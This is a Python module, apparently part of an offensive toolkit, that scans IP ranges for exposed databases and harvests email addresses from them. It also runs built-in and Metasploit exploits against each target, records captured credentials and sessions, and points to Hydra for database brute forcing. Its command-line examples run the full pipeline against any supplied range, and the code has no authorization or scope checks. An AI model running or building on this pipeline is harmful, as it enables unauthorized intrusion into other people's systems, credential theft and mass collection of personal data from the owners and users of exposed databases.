"""
Full Scan Workflow Module

Provides comprehensive workflow for searching all databases for emails,
identifying vulnerable IPs/devices, and integrating with Metasploit, Nmap,
and other Kali tools.
"""

import os
import sys
import json
import time
import subprocess
import argparse
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, asdict, field
from datetime import datetime
from pathlib import Path

from .ip_scanner import IPScanner
from .database_detector import DatabaseDetector
from .mongodb_extractor import MongoDBExtractor
from .elasticsearch_extractor import ElasticsearchExtractor
from .redis_extractor import RedisExtractor
from .security_assessor import SecurityAssessor
from .metasploit_integration import MetasploitIntegration
from .nmap_integration import NmapIntegration
from .tshark_integration import TSharkIntegration
from .vulnerability_exploiter import VulnerabilityExploiter


@dataclass
class ScanTarget:
    """Scan target information"""
    ip: str
    port: int
    database_type: str
    service: str
    version: Optional[str] = None
    product: Optional[str] = None
    hostname: Optional[str] = None
    os: Optional[str] = None


@dataclass
class EmailExtractionResult:
    """Email extraction result"""
    target: ScanTarget
    emails: List[str]
    extraction_time: float
    success: bool
    error: Optional[str] = None


@dataclass
class VulnerabilityResult:
    """Vulnerability scan result"""
    target: ScanTarget
    vulnerabilities: List[Dict[str, Any]]
    security_score: int
    risk_level: str
    assessment_time: float


@dataclass
class ExploitResult:
    """Exploit result"""
    target: ScanTarget
    exploit_module: str
    success: bool
    output: str
    credentials: Optional[Dict[str, str]] = None
    session_id: Optional[int] = None
    extraction_time: float = 0.0


@dataclass
class FullScanReport:
    """Full scan report"""
    scan_id: str
    start_time: datetime
    end_time: Optional[datetime] = None
    targets: Optional[List[ScanTarget]] = None
    email_results: Optional[List[EmailExtractionResult]] = None
    vulnerability_results: Optional[List[VulnerabilityResult]] = None
    exploit_results: Optional[List[ExploitResult]] = None
    total_emails: int = 0
    total_vulnerabilities: int = 0
    total_exploits: int = 0
    summary: Optional[Dict[str, Any]] = None
    
    def __post_init__(self):
        if self.targets is None:
            self.targets = []
        if self.email_results is None:
            self.email_results = []
        if self.vulnerability_results is None:
            self.vulnerability_results = []
        if self.exploit_results is None:
            self.exploit_results = []
        if self.summary is None:
            self.summary = {}


class FullScanWorkflow:
    """
    Comprehensive workflow for database scanning, email extraction,
    vulnerability assessment, and exploitation.
    
    Features:
    - Scan IP ranges for exposed databases
    - Extract emails from all discovered databases
    - Assess security vulnerabilities
    - Run Metasploit exploits
    - Run Nmap scans
    - Integrate with Kali Linux tools
    - Generate comprehensive reports
    """
    
    # Kali Linux tools to integrate
    KALI_TOOLS = {
        'nmap': 'nmap',
        'metasploit': 'msfconsole',
        'sqlmap': 'sqlmap',
        'nikto': 'nikto',
        'dirb': 'dirb',
        'gobuster': 'gobuster',
        'hydra': 'hydra',
        'john': 'john',
        'hashcat': 'hashcat',
        'wireshark': 'wireshark',
        'tshark': 'tshark',
        'aircrack-ng': 'aircrack-ng',
        'burpsuite': 'burpsuite',
        'zap': 'zaproxy',
    }
    
    def __init__(
        self,
        output_dir: str = 'scan_results',
        verbose: bool = False,
        timeout: float = 5.0
    ):
        """
        Initialize full scan workflow.
        
        Args:
            output_dir: Directory for output files
            verbose: Enable verbose output
            timeout: Socket timeout in seconds
        """
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.verbose = verbose
        self.timeout = timeout
        
        # Initialize components
        self.scanner = IPScanner()
        self.detector = DatabaseDetector()
        self.mongodb_extractor = MongoDBExtractor()
        self.elasticsearch_extractor = ElasticsearchExtractor()
        self.redis_extractor = RedisExtractor()
        self.security_assessor = SecurityAssessor(timeout=timeout)
        self.metasploit = MetasploitIntegration()
        self.nmap = NmapIntegration()
        self.tshark = TSharkIntegration()
        self.exploiter = VulnerabilityExploiter(timeout=timeout)
        
        # Check tool availability
        self.available_tools = self._check_tool_availability()
    
    def _check_tool_availability(self) -> Dict[str, bool]:
        """
        Check availability of Kali Linux tools.
        
        Returns:
            Dictionary mapping tool names to availability status
        """
        available = {}
        
        for tool_name, tool_cmd in self.KALI_TOOLS.items():
            try:
                result = subprocess.run(
                    [tool_cmd, '--version'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                available[tool_name] = result.returncode == 0
            except (subprocess.TimeoutExpired, FileNotFoundError, subprocess.SubprocessError):
                available[tool_name] = False
        
        return available
    
    def scan_ip_range(
        self,
        ip_range: str,
        ports: Optional[List[int]] = None,
        database_types: Optional[List[str]] = None
    ) -> List[ScanTarget]:
        """
        Scan IP range for exposed databases.
        
        Args:
            ip_range: IP range in CIDR notation
            ports: List of ports to scan
            database_types: List of database types to scan for
            
        Returns:
            List of ScanTarget objects
        """
        print(f"[*] Scanning IP range: {ip_range}")
        
        targets = []
        
        # Use Nmap for advanced scanning if available
        if self.available_tools.get('nmap'):
            print("[*] Using Nmap for advanced service detection...")
            targets = self._scan_with_nmap(ip_range, database_types)
        else:
            print("[*] Using built-in scanner...")
            targets = self._scan_with_builtin_scanner(ip_range, ports)
        
        print(f"[+] Found {len(targets)} database targets")
        return targets
    
    def _scan_with_nmap(
        self,
        ip_range: str,
        database_types: Optional[List[str]] = None
    ) -> List[ScanTarget]:
        """
        Scan using Nmap.
        
        Args:
            ip_range: IP range to scan
            database_types: Database types to scan for
            
        Returns:
            List of ScanTarget objects
        """
        targets = []
        
        # Scan for database services
        databases = self.nmap.scan_database_services(
            target=ip_range,
            database_types=database_types
        )
        
        for db in databases:
            targets.append(ScanTarget(
                ip=db['ip'],
                port=db['port'],
                database_type=db['database_type'],
                service=db['service'],
                version=db.get('version'),
                product=db.get('product'),
                hostname=db.get('hostname'),
                os=db.get('os')
            ))
        
        return targets
    
    def _scan_with_builtin_scanner(
        self,
        ip_range: str,
        ports: Optional[List[int]] = None
    ) -> List[ScanTarget]:
        """
        Scan using built-in scanner.
        
        Args:
            ip_range: IP range to scan
            ports: Ports to scan
            
        Returns:
            List of ScanTarget objects
        """
        targets = []
        
        # Default database ports
        if ports is None:
            ports = [27017, 9200, 6379, 3306, 5432, 5984, 8086, 8529, 7474, 9042, 11211, 28015]
        
        # Scan IP range
        scan_results = self.scanner.scan_ip_range(
            ip_range=ip_range,
            ports=ports,
            grab_banner=True
        )
        
        for result in scan_results:
            if result.is_open:
                # Detect database type
                db_type = self._detect_database_type(result.port, result.banner)
                
                targets.append(ScanTarget(
                    ip=result.ip,
                    port=result.port,
                    database_type=db_type,
                    service=result.service or 'unknown',
                    version=result.banner
                ))
        
        return targets
    
    def _detect_database_type(self, port: int, banner: Optional[str] = None) -> str:
        """
        Detect database type from port and banner.
        
        Args:
            port: Port number
            banner: Service banner
            
        Returns:
            Database type string
        """
        port_map = {
            27017: 'mongodb',
            27018: 'mongodb',
            27019: 'mongodb',
            9200: 'elasticsearch',
            9300: 'elasticsearch',
            6379: 'redis',
            6380: 'redis',
            26379: 'redis',
            3306: 'mysql',
            5432: 'postgresql',
            5984: 'couchdb',
            8086: 'influxdb',
            8088: 'influxdb',
            8529: 'arangodb',
            7474: 'neo4j',
            7687: 'neo4j',
            9042: 'cassandra',
            9160: 'cassandra',
            11211: 'memcached',
            28015: 'rethinkdb',
            29015: 'rethinkdb',
        }
        
        db_type = port_map.get(port, 'unknown')
        
        # Try to detect from banner if available
        if banner and db_type == 'unknown':
            banner_lower = banner.lower()
            if 'mongodb' in banner_lower:
                db_type = 'mongodb'
            elif 'elasticsearch' in banner_lower:
                db_type = 'elasticsearch'
            elif 'redis' in banner_lower:
                db_type = 'redis'
            elif 'mysql' in banner_lower:
                db_type = 'mysql'
            elif 'postgresql' in banner_lower or 'postgres' in banner_lower:
                db_type = 'postgresql'
        
        return db_type
    
    def extract_emails_from_all(
        self,
        targets: List[ScanTarget]
    ) -> List[EmailExtractionResult]:
        """
        Extract emails from all discovered databases.
        
        Args:
            targets: List of scan targets
            
        Returns:
            List of EmailExtractionResult objects
        """
        print(f"[*] Extracting emails from {len(targets)} targets...")
        
        results = []
        
        for target in targets:
            print(f"[*] Extracting from {target.ip}:{target.port} ({target.database_type})")
            
            result = self._extract_emails_from_target(target)
            results.append(result)
            
            if result.success:
                print(f"[+] Found {len(result.emails)} emails from {target.ip}:{target.port}")
            else:
                print(f"[-] Failed to extract from {target.ip}:{target.port}: {result.error}")
        
        return results
    
    def _extract_emails_from_target(self, target: ScanTarget) -> EmailExtractionResult:
        """
        Extract emails from a single target.
        
        Args:
            target: Scan target
            
        Returns:
            EmailExtractionResult object
        """
        start_time = time.time()
        
        try:
            emails = []
            
            if target.database_type == 'mongodb':
                emails = self._extract_mongodb_emails(target)
            elif target.database_type == 'elasticsearch':
                emails = self._extract_elasticsearch_emails(target)
            elif target.database_type == 'redis':
                emails = self._extract_redis_emails(target)
            elif target.database_type == 'mysql':
                emails = self._extract_mysql_emails(target)
            elif target.database_type == 'postgresql':
                emails = self._extract_postgresql_emails(target)
            else:
                # Try generic extraction
                emails = self._extract_generic_emails(target)
            
            return EmailExtractionResult(
                target=target,
                emails=emails,
                extraction_time=time.time() - start_time,
                success=True
            )
            
        except Exception as e:
            return EmailExtractionResult(
                target=target,
                emails=[],
                extraction_time=time.time() - start_time,
                success=False,
                error=str(e)
            )
    
    def _extract_mongodb_emails(self, target: ScanTarget) -> List[str]:
        """Extract emails from MongoDB"""
        try:
            result = self.exploiter.exploit_mongodb(target.ip, target.port)
            return result.emails
        except Exception as e:
            if self.verbose:
                print(f"Error extracting MongoDB emails: {e}")
            return []
    
    def _extract_elasticsearch_emails(self, target: ScanTarget) -> List[str]:
        """Extract emails from Elasticsearch"""
        try:
            result = self.exploiter.exploit_elasticsearch(target.ip, target.port)
            return result.emails
        except Exception as e:
            if self.verbose:
                print(f"Error extracting Elasticsearch emails: {e}")
            return []
    
    def _extract_redis_emails(self, target: ScanTarget) -> List[str]:
        """Extract emails from Redis"""
        try:
            result = self.exploiter.exploit_redis(target.ip, target.port)
            return result.emails
        except Exception as e:
            if self.verbose:
                print(f"Error extracting Redis emails: {e}")
            return []
    
    def _extract_mysql_emails(self, target: ScanTarget) -> List[str]:
        """Extract emails from MySQL"""
        try:
            result = self.exploiter.exploit_mysql(target.ip, target.port)
            return result.emails
        except Exception as e:
            if self.verbose:
                print(f"Error extracting MySQL emails: {e}")
            return []
    
    def _extract_postgresql_emails(self, target: ScanTarget) -> List[str]:
        """Extract emails from PostgreSQL"""
        try:
            result = self.exploiter.exploit_postgresql(target.ip, target.port)
            return result.emails
        except Exception as e:
            if self.verbose:
                print(f"Error extracting PostgreSQL emails: {e}")
            return []
    
    def _extract_generic_emails(self, target: ScanTarget) -> List[str]:
        """Extract emails using generic methods"""
        emails = []
        
        try:
            # Try to connect and extract emails
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((target.ip, target.port))
            
            # Send generic request
            sock.send(b'INFO\r\n')
            response = sock.recv(65536).decode('utf-8', errors='ignore')
            
            # Extract emails from response
            import re
            email_pattern = re.compile(
                r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
            )
            emails = email_pattern.findall(response)
            
            sock.close()
            
        except Exception:
            pass
        
        return list(set(emails))
    
    def assess_vulnerabilities(
        self,
        targets: List[ScanTarget]
    ) -> List[VulnerabilityResult]:
        """
        Assess security vulnerabilities for all targets.
        
        Args:
            targets: List of scan targets
            
        Returns:
            List of VulnerabilityResult objects
        """
        print(f"[*] Assessing vulnerabilities for {len(targets)} targets...")
        
        results = []
        
        for target in targets:
            print(f"[*] Assessing {target.ip}:{target.port} ({target.database_type})")
            
            result = self._assess_target_vulnerabilities(target)
            results.append(result)
            
            print(f"[+] Security score: {result.security_score}/100 ({result.risk_level})")
        
        return results
    
    def _assess_target_vulnerabilities(self, target: ScanTarget) -> VulnerabilityResult:
        """
        Assess vulnerabilities for a single target.
        
        Args:
            target: Scan target
            
        Returns:
            VulnerabilityResult object
        """
        start_time = time.time()
        
        try:
            assessment = None
            
            if target.database_type == 'mongodb':
                assessment = self.security_assessor.assess_mongodb(target.ip, target.port)
            elif target.database_type == 'elasticsearch':
                assessment = self.security_assessor.assess_elasticsearch(target.ip, target.port)
            elif target.database_type == 'redis':
                assessment = self.security_assessor.assess_redis(target.ip, target.port)
            else:
                # Generic assessment
                assessment = self._generic_vulnerability_assessment(target)
            
            vulnerabilities = []
            for vuln in assessment.vulnerabilities:
                vulnerabilities.append({
                    'name': vuln.name,
                    'description': vuln.description,
                    'level': vuln.level.value,
                    'recommendation': vuln.recommendation,
                    'evidence': vuln.evidence
                })
            
            return VulnerabilityResult(
                target=target,
                vulnerabilities=vulnerabilities,
                security_score=assessment.security_score,
                risk_level=assessment.risk_level,
                assessment_time=time.time() - start_time
            )
            
        except Exception as e:
            if self.verbose:
                print(f"Error assessing vulnerabilities: {e}")
            
            return VulnerabilityResult(
                target=target,
                vulnerabilities=[],
                security_score=0,
                risk_level='unknown',
                assessment_time=time.time() - start_time
            )
    
    def _generic_vulnerability_assessment(self, target: ScanTarget):
        """Generic vulnerability assessment"""
        # Create a simple assessment for unknown database types
        from .security_assessor import SecurityAssessment, Vulnerability, VulnerabilityLevel
        
        vulnerabilities = []
        
        # Check if port is open
        try:
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((target.ip, target.port))
            sock.close()
            
            vulnerabilities.append(Vulnerability(
                name='Open Port',
                description=f'Port {target.port} is open',
                level=VulnerabilityLevel.INFO,
                recommendation='Review if this port should be exposed',
                evidence=f'Port {target.port} is accessible'
            ))
            
        except Exception:
            pass
        
        return SecurityAssessment(
            ip=target.ip,
            port=target.port,
            database_type=target.database_type,
            vulnerabilities=vulnerabilities,
            security_score=100,
            risk_level='low',
            assessment_time=0.0
        )
    
    def run_exploits(
        self,
        targets: List[ScanTarget],
        use_metasploit: bool = True
    ) -> List[ExploitResult]:
        """
        Run exploits against vulnerable targets.
        
        Args:
            targets: List of scan targets
            use_metasploit: Use Metasploit for exploitation
            
        Returns:
            List of ExploitResult objects
        """
        print(f"[*] Running exploits against {len(targets)} targets...")
        
        results = []
        
        for target in targets:
            print(f"[*] Exploiting {target.ip}:{target.port} ({target.database_type})")
            
            result = self._run_exploit(target, use_metasploit)
            results.append(result)
            
            if result.success:
                print(f"[+] Successfully exploited {target.ip}:{target.port}")
            else:
                print(f"[-] Failed to exploit {target.ip}:{target.port}")
        
        return results
    
    def _run_exploit(
        self,
        target: ScanTarget,
        use_metasploit: bool
    ) -> ExploitResult:
        """
        Run exploit against a single target.
        
        Args:
            target: Scan target
            use_metasploit: Use Metasploit
            
        Returns:
            ExploitResult object
        """
        start_time = time.time()
        
        try:
            # Try Metasploit if available and requested
            if use_metasploit and self.available_tools.get('metasploit'):
                result = self._run_metasploit_exploit(target)
                if result.success:
                    return result
            
            # Try built-in exploits
            result = self._run_builtin_exploit(target)
            return result
            
        except Exception as e:
            return ExploitResult(
                target=target,
                exploit_module='none',
                success=False,
                output=f'Error: {e}',
                extraction_time=time.time() - start_time
            )
    
    def _run_metasploit_exploit(self, target: ScanTarget) -> ExploitResult:
        """
        Run Metasploit exploit.
        
        Args:
            target: Scan target
            
        Returns:
            ExploitResult object
        """
        start_time = time.time()
        
        try:
            # Search for exploits
            exploits = self.metasploit.search_exploits(target.database_type)
            
            if not exploits:
                return ExploitResult(
                    target=target,
                    exploit_module='none',
                    success=False,
                    output='No Metasploit exploits found',
                    extraction_time=time.time() - start_time
                )
            
            # Try first exploit
            exploit_module = exploits[0].path
            
            result = self.metasploit.exploit_database(
                target_ip=target.ip,
                target_port=target.port,
                database_type=target.database_type,
                exploit_module=exploit_module
            )
            
            return ExploitResult(
                target=target,
                exploit_module=exploit_module,
                success=result.success,
                output=result.output,
                credentials=result.credentials,
                session_id=result.session_id,
                extraction_time=time.time() - start_time
            )
            
        except Exception as e:
            return ExploitResult(
                target=target,
                exploit_module='metasploit',
                success=False,
                output=f'Metasploit error: {e}',
                extraction_time=time.time() - start_time
            )
    
    def _run_builtin_exploit(self, target: ScanTarget) -> ExploitResult:
        """
        Run built-in exploit.
        
        Args:
            target: Scan target
            
        Returns:
            ExploitResult object
        """
        start_time = time.time()
        
        try:
            result = None
            
            if target.database_type == 'mongodb':
                result = self.exploiter.exploit_mongodb(target.ip, target.port)
            elif target.database_type == 'elasticsearch':
                result = self.exploiter.exploit_elasticsearch(target.ip, target.port)
            elif target.database_type == 'redis':
                result = self.exploiter.exploit_redis(target.ip, target.port)
            elif target.database_type == 'mysql':
                result = self.exploiter.exploit_mysql(target.ip, target.port)
            elif target.database_type == 'postgresql':
                result = self.exploiter.exploit_postgresql(target.ip, target.port)
            else:
                return ExploitResult(
                    target=target,
                    exploit_module='none',
                    success=False,
                    output='No exploit available for this database type',
                    extraction_time=time.time() - start_time
                )
            
            return ExploitResult(
                target=target,
                exploit_module=result.exploit_module,
                success=result.success,
                output=result.output,
                credentials=result.credentials,
                extraction_time=time.time() - start_time
            )
            
        except Exception as e:
            return ExploitResult(
                target=target,
                exploit_module='builtin',
                success=False,
                output=f'Built-in exploit error: {e}',
                extraction_time=time.time() - start_time
            )
    
    def run_nmap_vulnerability_scan(
        self,
        targets: List[ScanTarget]
    ) -> List[Dict[str, Any]]:
        """
        Run Nmap vulnerability scan.
        
        Args:
            targets: List of scan targets
            
        Returns:
            List of vulnerability dictionaries
        """
        if not self.available_tools.get('nmap'):
            print("[-] Nmap not available")
            return []
        
        print(f"[*] Running Nmap vulnerability scan on {len(targets)} targets...")
        
        all_vulnerabilities = []
        
        for target in targets:
            print(f"[*] Scanning {target.ip}:{target.port}")
            
            vulnerabilities = self.nmap.vulnerability_scan(
                target=target.ip,
                ports=str(target.port)
            )
            
            all_vulnerabilities.extend(vulnerabilities)
            
            print(f"[+] Found {len(vulnerabilities)} vulnerabilities")
        
        return all_vulnerabilities
    
    def run_kali_tool_scan(
        self,
        targets: List[ScanTarget],
        tools: Optional[List[str]] = None
    ) -> Dict[str, Any]:
        """
        Run Kali Linux tools against targets.
        
        Args:
            targets: List of scan targets
            tools: List of tools to run (default: all available)
            
        Returns:
            Dictionary containing tool results
        """
        if tools is None:
            tools = [t for t, available in self.available_tools.items() if available]
        
        print(f"[*] Running Kali tools: {', '.join(tools)}")
        
        results = {}
        
        for tool in tools:
            if not self.available_tools.get(tool):
                print(f"[-] {tool} not available")
                continue
            
            print(f"[*] Running {tool}...")
            
            tool_results = self._run_kali_tool(tool, targets)
            results[tool] = tool_results
        
        return results
    
    def _run_kali_tool(
        self,
        tool: str,
        targets: List[ScanTarget]
    ) -> List[Dict[str, Any]]:
        """
        Run a specific Kali tool.
        
        Args:
            tool: Tool name
            targets: List of targets
            
        Returns:
            List of tool results
        """
        results = []
        
        for target in targets:
            try:
                if tool == 'nmap':
                    result = self._run_nmap_scan(target)
                elif tool == 'sqlmap':
                    result = self._run_sqlmap_scan(target)
                elif tool == 'nikto':
                    result = self._run_nikto_scan(target)
                elif tool == 'hydra':
                    result = self._run_hydra_scan(target)
                else:
                    result = {'tool': tool, 'target': target.ip, 'status': 'not_implemented'}
                
                results.append(result)
                
            except Exception as e:
                results.append({
                    'tool': tool,
                    'target': target.ip,
                    'status': 'error',
                    'error': str(e)
                })
        
        return results
    
    def _run_nmap_scan(self, target: ScanTarget) -> Dict[str, Any]:
        """Run Nmap scan"""
        scan_result = self.nmap.scan_ports(
            target=target.ip,
            ports=str(target.port),
            service_detection=True,
            script_scan=True
        )
        
        return {
            'tool': 'nmap',
            'target': target.ip,
            'port': target.port,
            'status': 'completed',
            'hosts': len(scan_result.hosts),
            'scan_time': scan_result.scan_time
        }
    
    def _run_sqlmap_scan(self, target: ScanTarget) -> Dict[str, Any]:
        """Run SQLMap scan"""
        # SQLMap is typically for web applications, not databases directly
        return {
            'tool': 'sqlmap',
            'target': target.ip,
            'port': target.port,
            'status': 'skipped',
            'reason': 'SQLMap is for web applications'
        }
    
    def _run_nikto_scan(self, target: ScanTarget) -> Dict[str, Any]:
        """Run Nikto scan"""
        # Nikto is for web servers
        return {
            'tool': 'nikto',
            'target': target.ip,
            'port': target.port,
            'status': 'skipped',
            'reason': 'Nikto is for web servers'
        }
    
    def _run_hydra_scan(self, target: ScanTarget) -> Dict[str, Any]:
        """Run Hydra brute force scan"""
        # Hydra can be used for database brute forcing
        return {
            'tool': 'hydra',
            'target': target.ip,
            'port': target.port,
            'status': 'available',
            'note': 'Can be used for database brute forcing'
        }
    
    def run_full_workflow(
        self,
        ip_range: str,
        ports: Optional[List[int]] = None,
        database_types: Optional[List[str]] = None,
        extract_emails: bool = True,
        assess_vulnerabilities: bool = True,
        run_exploits: bool = True,
        use_metasploit: bool = True,
        run_kali_tools: bool = False,
        kali_tools: Optional[List[str]] = None
    ) -> FullScanReport:
        """
        Run complete workflow.
        
        Args:
            ip_range: IP range to scan
            ports: Ports to scan
            database_types: Database types to scan for
            extract_emails: Extract emails from databases
            assess_vulnerabilities: Assess security vulnerabilities
            run_exploits: Run exploits
            use_metasploit: Use Metasploit for exploitation
            run_kali_tools: Run Kali Linux tools
            kali_tools: Specific Kali tools to run
            
        Returns:
            FullScanReport object
        """
        scan_id = f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        start_time = datetime.now()
        
        print(f"[*] Starting full scan workflow: {scan_id}")
        print(f"[*] IP range: {ip_range}")
        print(f"[*] Start time: {start_time}")
        
        # Create report
        report = FullScanReport(
            scan_id=scan_id,
            start_time=start_time
        )
        
        try:
            # Step 1: Scan for databases
            print("\n" + "="*60)
            print("STEP 1: Scanning for databases")
            print("="*60)
            
            targets = self.scan_ip_range(ip_range, ports, database_types)
            report.targets = targets
            
            if not targets:
                print("[-] No databases found")
                report.end_time = datetime.now()
                return report
            
            # Step 2: Extract emails
            if extract_emails:
                print("\n" + "="*60)
                print("STEP 2: Extracting emails")
                print("="*60)
                
                email_results = self.extract_emails_from_all(targets)
                report.email_results = email_results
                
                # Count total emails
                all_emails = []
                for result in email_results:
                    all_emails.extend(result.emails)
                report.total_emails = len(set(all_emails))
                
                print(f"\n[+] Total unique emails found: {report.total_emails}")
            
            # Step 3: Assess vulnerabilities
            if assess_vulnerabilities:
                print("\n" + "="*60)
                print("STEP 3: Assessing vulnerabilities")
                print("="*60)
                
                vulnerability_results = self.assess_vulnerabilities(targets)
                report.vulnerability_results = vulnerability_results
                
                # Count total vulnerabilities
                total_vulns = sum(len(r.vulnerabilities) for r in vulnerability_results)
                report.total_vulnerabilities = total_vulns
                
                print(f"\n[+] Total vulnerabilities found: {report.total_vulnerabilities}")
            
            # Step 4: Run exploits
            if run_exploits:
                print("\n" + "="*60)
                print("STEP 4: Running exploits")
                print("="*60)
                
                exploit_results = self.run_exploits(targets, use_metasploit)
                report.exploit_results = exploit_results
                
                # Count successful exploits
                successful_exploits = sum(1 for r in exploit_results if r.success)
                report.total_exploits = successful_exploits
                
                print(f"\n[+] Successful exploits: {report.total_exploits}")
            
            # Step 5: Run Kali tools
            if run_kali_tools:
                print("\n" + "="*60)
                print("STEP 5: Running Kali Linux tools")
                print("="*60)
                
                kali_results = self.run_kali_tool_scan(targets, kali_tools)
                report.summary['kali_tools'] = kali_results
            
            # Generate summary
            if report.summary is None:
                report.summary = {}
            report.summary.update({
                'total_targets': len(targets),
                'total_emails': report.total_emails,
                'total_vulnerabilities': report.total_vulnerabilities,
                'total_exploits': report.total_exploits,
                'database_types': list(set(t.database_type for t in targets)),
                'ips_scanned': list(set(t.ip for t in targets)),
            })
            
            report.end_time = datetime.now()
            
            # Save report
            self._save_report(report)
            
            print("\n" + "="*60)
            print("SCAN COMPLETE")
            print("="*60)
            print(f"Scan ID: {scan_id}")
            print(f"Duration: {report.end_time - start_time}")
            print(f"Targets found: {len(targets)}")
            print(f"Emails extracted: {report.total_emails}")
            print(f"Vulnerabilities found: {report.total_vulnerabilities}")
            print(f"Successful exploits: {report.total_exploits}")
            print(f"\nReport saved to: {self.output_dir / f'{scan_id}.json'}")
            
            return report
            
        except Exception as e:
            print(f"\n[-] Error during scan: {e}")
            report.end_time = datetime.now()
            report.summary['error'] = str(e)
            self._save_report(report)
            return report
    
    def _save_report(self, report: FullScanReport):
        """
        Save scan report to file.
        
        Args:
            report: FullScanReport object
        """
        report_file = self.output_dir / f"{report.scan_id}.json"
        
        # Convert report to dictionary
        report_dict = {
            'scan_id': report.scan_id,
            'start_time': report.start_time.isoformat(),
            'end_time': report.end_time.isoformat() if report.end_time else None,
            'targets': [asdict(t) for t in report.targets],
            'email_results': [asdict(r) for r in report.email_results],
            'vulnerability_results': [asdict(r) for r in report.vulnerability_results],
            'exploit_results': [asdict(r) for r in report.exploit_results],
            'total_emails': report.total_emails,
            'total_vulnerabilities': report.total_vulnerabilities,
            'total_exploits': report.total_exploits,
            'summary': report.summary
        }
        
        with open(report_file, 'w') as f:
            json.dump(report_dict, f, indent=2)
        
        # Also save emails to separate file
        if report.email_results:
            emails_file = self.output_dir / f"{report.scan_id}_emails.txt"
            all_emails = []
            for result in report.email_results:
                all_emails.extend(result.emails)
            
            with open(emails_file, 'w') as f:
                for email in sorted(set(all_emails)):
                    f.write(f"{email}\n")
        
        # Save vulnerabilities to separate file
        if report.vulnerability_results:
            vulns_file = self.output_dir / f"{report.scan_id}_vulnerabilities.json"
            all_vulns = []
            for result in report.vulnerability_results:
                for vuln in result.vulnerabilities:
                    vuln['target_ip'] = result.target.ip
                    vuln['target_port'] = result.target.port
                    vuln['database_type'] = result.target.database_type
                    all_vulns.append(vuln)
            
            with open(vulns_file, 'w') as f:
                json.dump(all_vulns, f, indent=2)


def main():
    """Main entry point for full scan workflow"""
    parser = argparse.ArgumentParser(
        description='Full Scan Workflow - Search all databases for emails and vulnerabilities',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Scan IP range for databases and extract emails
  full-scan --range 192.168.1.0/24 --extract-emails
  
  # Scan and assess vulnerabilities
  full-scan --range 192.168.1.0/24 --assess-vulnerabilities
  
  # Full workflow with exploits
  full-scan --range 192.168.1.0/24 --extract-emails --assess-vulnerabilities --run-exploits
  
  # Use Metasploit for exploitation
  full-scan --range 192.168.1.0/24 --run-exploits --use-metasploit
  
  # Run Kali Linux tools
  full-scan --range 192.168.1.0/24 --run-kali-tools --kali-tools nmap,hydra
  
  # Scan specific database types
  full-scan --range 192.168.1.0/24 --database-types mongodb,elasticsearch,redis
  
  # Scan specific ports
  full-scan --range 192.168.1.0/24 --ports 27017,9200,6379
        """
    )
    
    parser.add_argument(
        '--range', '-r',
        required=True,
        help='IP range in CIDR notation (e.g., 192.168.1.0/24)'
    )
    parser.add_argument(
        '--ports', '-p',
        help='Comma-separated list of ports to scan'
    )
    parser.add_argument(
        '--database-types', '-d',
        help='Comma-separated list of database types to scan (mongodb,elasticsearch,redis,mysql,postgresql)'
    )
    parser.add_argument(
        '--extract-emails', '-e',
        action='store_true',
        help='Extract emails from discovered databases'
    )
    parser.add_argument(
        '--assess-vulnerabilities', '-a',
        action='store_true',
        help='Assess security vulnerabilities'
    )
    parser.add_argument(
        '--run-exploits', '-x',
        action='store_true',
        help='Run exploits against vulnerable targets'
    )
    parser.add_argument(
        '--use-metasploit', '-m',
        action='store_true',
        help='Use Metasploit for exploitation'
    )
    parser.add_argument(
        '--run-kali-tools', '-k',
        action='store_true',
        help='Run Kali Linux tools'
    )
    parser.add_argument(
        '--kali-tools', '-t',
        help='Comma-separated list of Kali tools to run (nmap,sqlmap,nikto,hydra)'
    )
    parser.add_argument(
        '--output-dir', '-o',
        default='scan_results',
        help='Output directory for results (default: scan_results)'
    )
    parser.add_argument(
        '--verbose', '-v',
        action='store_true',
        help='Enable verbose output'
    )
    parser.add_argument(
        '--timeout',
        type=float,
        default=5.0,
        help='Socket timeout in seconds (default: 5.0)'
    )
    
    args = parser.parse_args()
    
    # Parse ports
    ports = None
    if args.ports:
        ports = [int(p.strip()) for p in args.ports.split(',')]
    
    # Parse database types
    database_types = None
    if args.database_types:
        database_types = [dt.strip() for dt in args.database_types.split(',')]
    
    # Parse Kali tools
    kali_tools = None
    if args.kali_tools:
        kali_tools = [t.strip() for t in args.kali_tools.split(',')]
    
    # Create workflow
    workflow = FullScanWorkflow(
        output_dir=args.output_dir,
        verbose=args.verbose,
        timeout=args.timeout
    )
    
    # Run workflow
    report = workflow.run_full_workflow(
        ip_range=args.range,
        ports=ports,
        database_types=database_types,
        extract_emails=args.extract_emails,
        assess_vulnerabilities=args.assess_vulnerabilities,
        run_exploits=args.run_exploits,
        use_metasploit=args.use_metasploit,
        run_kali_tools=args.run_kali_tools,
        kali_tools=kali_tools
    )
    
    return 0 if report.total_emails > 0 or report.total_exploits > 0 else 1


if __name__ == '__main__':
    sys.exit(main())
